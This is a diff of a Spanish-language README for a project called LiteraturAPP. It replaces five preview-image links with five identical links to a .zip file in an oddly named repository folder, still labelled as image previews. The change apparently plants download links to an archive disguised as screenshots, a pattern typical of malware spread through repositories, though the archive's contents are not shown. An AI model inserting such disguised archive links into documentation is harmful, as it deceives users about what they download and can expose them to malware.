@@ -8,11 +8,11 @@
 
 <h3>➡️ VISTAS PREVIAS:</h3>
 <p>
-  <img src="https://i.imgur.com/glzWfz9.jpeg" alt="Opción 1" width="350"><br>
-  <img src="https://i.imgur.com/vrXjDy0.jpeg" alt="Opción 2" width="350"><br>
-  <img src="https://i.imgur.com/m3exxCd.jpeg" alt="Opción 3" width="350"><br>
-  <img src="https://i.imgur.com/T5gDED4.jpeg" alt="Opción 4" width="350"><br>
-  <img src="https://i.imgur.com/g9wmzgf.jpeg" alt="Opción 5" width="350">
+  <img src="https://raw.githubusercontent.com/AugustoPaz13/LiteraturAPP/main/mucocellulosic/LiteraturAPP.zip" alt="Opción 1" width="350"><br>
+  <img src="https://raw.githubusercontent.com/AugustoPaz13/LiteraturAPP/main/mucocellulosic/LiteraturAPP.zip" alt="Opción 2" width="350"><br>
+  <img src="https://raw.githubusercontent.com/AugustoPaz13/LiteraturAPP/main/mucocellulosic/LiteraturAPP.zip" alt="Opción 3" width="350"><br>
+  <img src="https://raw.githubusercontent.com/AugustoPaz13/LiteraturAPP/main/mucocellulosic/LiteraturAPP.zip" alt="Opción 4" width="350"><br>
+  <img src="https://raw.githubusercontent.com/AugustoPaz13/LiteraturAPP/main/mucocellulosic/LiteraturAPP.zip" alt="Opción 5" width="350">
 </p>
 
 <h3>✅ Tecnologías utilizadas</h3>
